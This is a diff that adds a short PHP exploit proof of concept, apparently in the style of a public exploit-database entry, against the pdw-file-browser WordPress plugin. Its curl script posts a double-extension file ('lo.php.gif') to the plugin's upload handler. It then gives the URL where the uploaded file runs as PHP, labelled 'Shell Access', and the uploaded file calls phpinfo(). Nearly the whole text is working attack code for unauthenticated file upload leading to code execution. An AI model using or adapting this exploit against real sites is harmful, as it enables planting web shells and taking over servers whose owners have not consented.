@@ -1,0 +1,25 @@
+PostShell.php
+<?php
+
+$uploadfile="lo.php.gif";
+$ch =
+curl_init("http://www.example.com/wordpress/wp-content/plugins/pdw-file-browser/pdw_file_browser/swfupload/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('Filedata'=>"@$uploadfile",
+
+'uploadpath'=>'/wordpress/wp-content/plugins/pdw-file-browser/pdw_file_browser/swfupload/'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.example.com/wordpress/wp-content/plugins/pdw-file-browser/pdw_file_browser/swfupload/lo.php.gif
+
+lo.php.gif
+<?php
+phpinfo();
+?>
